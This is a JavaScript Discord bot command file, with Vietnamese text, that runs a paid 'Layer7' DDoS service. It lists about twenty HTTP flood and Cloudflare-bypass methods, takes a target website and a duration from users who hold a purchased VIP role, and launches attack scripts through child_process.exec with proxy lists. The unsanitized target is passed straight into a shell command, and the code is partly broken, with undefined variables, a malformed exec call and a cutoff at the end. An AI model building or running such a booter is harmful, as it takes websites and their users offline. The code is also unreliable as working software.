const { MessageEmbed } = require("discord.js")
const ayarlar = require('../../ayarlar.json');
var version = ayarlar.versionbot;
var roleID = ayarlar.roleID;
var img = ayarlar.img;

module.exports = {
    name: 'layer7',
    description: 'TẤN CÔNG CÁC TRANG WEB VỚI LAYER7',
    type: 'CHAT_INPUT',
    cooldown: 40,
    options: [
      {
    name: "methods",
      description: "Enter your methods",
       type: "STRING",
       required : true,
      choices: [{
            name: `${'HTTP-RAW'}`,
            value: `${'HTTPRAW'}`,
            inline: true
        }, {
            name: `${'CF-FLOOD'}`,
            value: `${'CFFLOOD'}`,
            inline: true
       }, {
            name: `${'HTTP-REQUEST'}`,
            value: `${'HTTPREQUEST'}`,
            inline: true
        }, {
            name: `${'HTTPv1'}`,
            value: `${'HTTPv1'}`,
            inline: true
}, {
            name: `${'HTTP-FLOOD'}`,
            value: `${'HTTPFLOOD'}`,
            inline: true
        }, {
            name: `${'CFSTRONG'}`,
            value: `${'CFSTRONG'}`,
            inline: true
        }, {
            name: `${'HTTP-BROWSERv2'}`,
            value: `${'HTTPBROWSERv2'}`,
            inline: true
        
              
}, {
            name: `${'HTTP-MIX'}`,
            value: `${'HTTPMIX '}`,
            inline: true
        
        }, {
            name: `${'BROWSER'}`,
            value: `${'BROWSER'}`,
            inline: true
        }, {
            name: `${'HTTPS-FORCE'}`,
            value: `${'HTTPSFORCE'}`,
            inline: true
        }, {
            name: `${'UAM-BYPASS'}`,
            value: `${'UAMBYPASS'}`,
            inline: true
        
      }, {
          name: `${'HTTP-LOAD'}`,
            value: `${'HTTPLOAD'}`,
            inline: true
        
      
      },{
        name: `${'CFBypass'}`,
            value: `${'CFBypass'}`,
            inline: true
        },{
        name: `${'FLOOD-JS'}`,
            value: `${'FLOODJS'}`,
            inline: true
        
  }, {
            name: `${'HTTP-NULL'}`,
            value: `${'HTTPNULL'}`,
            inline: true
  },{
        name: `${'TLSV2'}`,
            value: `${'TLSV2'}`,
            inline: true
},{
        name: `${'CF-TLS'}`,
            value: `${'CFTLS'}`,
            inline: true
  },{
        name: `${'HTTP-VIOLATION'}`,
            value: `${'HTTPVIOLATION'}`,
            inline: true
          },{
        name: `${'HTTP-FUZZ'}`,
            value: `${'HTTPFUZZ'}`,
            inline: true
    
      },{
        name: `${'STORM-BYPASS'}`,
            value: `${'STORMBYPASS'}`,
            inline: true
  
        }],
      }, 
{
  name: "target",
  description:"ENTER YOUR WEBSITE TO SENT ATTACK",
  required: true,  
  type: "STRING"
},
      {
        name: " time",
  description:"ENTER TIME TO SENT ATTACK",
  required: true,  
  type: "STRING"
      }],
  run: async (client, interaction) => {

    
    if (!interaction.member.roles.cache.has(roleID))
      return interaction.reply({
        embeds: [
          new MessageEmbed()
            .setColor("RANDOM")
            .setDescription(`Chỉ có <@&${roleID}> mới được dùng lệnh này \n Liên Hệ VIOLATION#1111 Để Mua  Sài Nhé!`)
            .setFooter({ text: "© Developer: VIOLATION#1111" })
            .setTimestamp(),
        ],
      });  
       const methods = interaction.options.getString("methods")
      const target = interaction.options.getString("target")
const time= 
interaction.options.getString("time")

    if (methods === 'HTTP-NULL') {
        var HTTPNULL = methods;
    var exec = require('child_process').exec
      exec(`node methods/L7/{HTTPNULL}.js ${target} ${time}`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] 
                                      })
                }, 3000)
            })
    }

   if (methods === 'HTTP-FUZZ') {
        var HTTPFUZZ = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${HTTPFUZZ}.js ${target} ${time}`, (error, stdout, stderr) => {
    });
    console.log('Một cuộc tấn công khởi chạy ID Discord:' + interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] 
                                      })
                }, 3000)
            })
   }
    
    if (methods === 'HTTP-REQUEST') {
        var HTTPREQUEST = methods;
    var exec = require('child_process').exec
      exec(`node methods/L7/${HTTPREQUEST}.js ${target} ${time} 30000 proxy.txt`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] 
                                      })
                }, 3000)
            })
    }
  if (methods === 'HTTP-VIOLATION') {
        var HTTPVIOLATION = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${httpkha}.js ${target} ${time} 30000 ua.txt`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`☠️ METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] 
                                      })
                }, 3000)
            })
  }
        if (methods === 'HTTPv1 ') {
       var HTTPv1 = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${http2}.js ${target} ${time} 20000 proxy.txt`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`☠️ METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] 
                                      })
                }, 3000)
            })
            }
    
    if (methods === 'HTTP-FLOOD') {
       var HTTPFLOOD = methods;
    var exec = require('child_process').exec
      exec(` exec(`node methods/L7/${./httpflood} ${target} ${time} http.txt 60 ua.txt`, (error, stdout, stderr) => {
    });
      console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://images-ext-1.discordapp.net/external/rih6CqS1c142ng6lON1TIBwlXhU1UMzNhdZXvq__XqY/https/media.tenor.com/_KsnH9YVT5QAAAPo/kakashi.mp4")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`☠️ METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [  60 giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] 
                                      })
                }, 3000)
            })
    }
    if (methods === 'CF-TLS') {
     var CFTLS = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${CFTLS}.js ${target} ${time} 3000 proxy.txt`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://images-ext-1.discordapp.net/external/rih6CqS1c142ng6lON1TIBwlXhU1UMzNhdZXvq__XqY/https/media.tenor.com/_KsnH9YVT5QAAAPo/kakashi.mp4")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] 
                                      })
                }, 3000)
            })
    }
    if (methods === 'CFSTRONG ') {
var CFSTRONG = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${CFSTRONG}.js ${target} ${time} 4000 GET proxy.txt 10000`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://images-ext-2.discordapp.net/external/i1vaCEI3LkIWM-1e-fAFtGZ-RpLQX-4xaRsbsI3tBCY/https/media.tenor.com/HYZD06iWjlwAAAPo/sasuke-naruto.mp4")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
         {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
         
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://images-ext-1.discordapp.net/external/Kv6Qjq8qECx69myYf6HFqyVEJs9o8LbN7JVLk_4C1IE/https/media.tenor.com/pF3s48bhdIsAAAPo/marin-kitagawa-anime-shy.mp4")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
    }

    
    if (methods === 'HTTP-BROWSERv2') {
var HTTPBROWSERv2 = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${HTTPBROWSERv2}.js ${target} ${time} 60 http.txt`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071675126388637777/1507452243_tumblr_og092aQQYM1tydz8to1_540.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
         {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
         
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
    }
            

    
          if (methods === 'HTTP-RAW') {
      var HTTPRAW = methods;
                  var exec = 
                  require('child_process').exec
       exec(`node methods/L7/${HTTPRAW}.js${target} ${time} GET`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
        }


  
     if (methods === 'TLSV2') {
       var TLSV2 = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${TLSV2}.js ${target} ${time} 5000`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  
})
                }, 3000)
            })
        }


     
    if (methods === 'HTTP-LOAD') {
  var HTTPLOAD = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${HTTPLOAD}.js GET ${target} http.txt ${time} 100 800`, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://images-ext-1.discordapp.net/external/gI8yAhEPG5Yy7PRIA2x10ImZasG_psjuAXff34l-7iY/https/media.tenor.com/xlFZTbLqs20AAAPo/itachi.mp4")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed] 
                                      })
                }, 3000)
            })
        }

            if (methods === 'BROWSER') {
         var BROWSER = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${BROWSER}.js GET ${target} http.txt ${time} 100 300 `, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://images-ext-2.discordapp.net/external/i1vaCEI3LkIWM-1e-fAFtGZ-RpLQX-4xaRsbsI3tBCY/https/media.tenor.com/HYZD06iWjlwAAAPo/sasuke-naruto.mp4")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
        }
     

    
          
          if (methods === 'FLOOD-JS') {
       var FLOODJS = methods;
    var exec = require('child_process').exec
       exec(`node methods/L7/${FLOODJS}.js ${target} proxy.txt ${time} GET`, (error, stdout, stderr) => {
    });
  console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🎃 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`🕒 Time:`",
          value: `\`\`\`css\n [ ${time} giây ] \n\`\`\``,
          inline: true,
          },
          {
            name: "`💀💴 Mode`",
            value:  `\`\`\`css\n [ Layer7 ]  \n\`\`\``,
            inline: true
    },


          
          {
                name: '**`💸 Plan:`**',
                value: `\`\`\`css\n  [ VIP ] \n\`\`\``,
                inline: true
})
        
 
                                                                .setFooter('© Developer: KAKASHI#0001', img)
        .setTimestamp();
          const countdownEmbed = new MessageEmbed()
            .setColor('RANDOM')
            .setTitle(version)
            .setDescription("ĐANG KIỂM TRA...")
            .setImage("https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif")
            .setFooter('© Developer: KAKASHI#0001', img)
            .setTimestamp()
          interaction.reply({ embeds: [countdownEmbed] }).then((message) => {
              setTimeout(function () {
                interaction.editReply({ embeds: [embed]  })
                }, 3000)
            })
        }

    
        
 
                                                                
                                                        



               
      if (methods === 'HTTP-MIX') {
       var HTTPMIX = methods;
    var exec = require('child_process').exec
      exec(`node methods/L7/${HTTPMIX}.js  ${target} ${time} `, (error, stdout, stderr) => {
    });
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
                .setImage("https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif")
        .addFields(
          {
        
          name: "`👨‍💻 Người Dùng:`",
          value: `\`\`\`css\n [ ${interaction.user.username} ] \n\`\`\``,
          inline: true,
        },
          {
          name: "`💥 METHODS:`",
          value: `\`\`\`css\n [ ${methods} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "`🎃 HOST:`",
          value: `\`\`\`css\n [ ${target} ] \n\`\`\``,
          inline: true,
        },
          {
